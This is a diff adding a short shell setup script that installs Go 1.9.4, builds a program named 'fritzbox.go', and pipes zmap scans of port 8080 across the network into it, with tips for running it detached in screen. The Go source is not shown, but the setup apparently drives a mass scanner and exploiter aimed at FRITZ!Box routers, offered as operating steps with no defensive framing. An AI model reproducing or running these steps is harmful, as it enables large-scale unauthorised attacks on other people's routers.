@@ -1,0 +1,21 @@
+cd /tmp
+wget https://dl.google.com/go/go1.9.4.linux-amd64.tar.gz -q
+tar -xzf go1.9.4.linux-amd64.tar.gz
+mv go /usr/local
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/Projects/Proj1
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+go version
+go env
+cd ~/
+
+go build fritzbox.go
+
+zmap -p8080 -B1M -i eth0 | ./fritzbox
+
+if you want to run in a screen (recommended)
+
+yum install screen -y
+screen zmap -p8080 -B1M -i eth0 | ./fritzbox
+
+CTRL A+D to detach
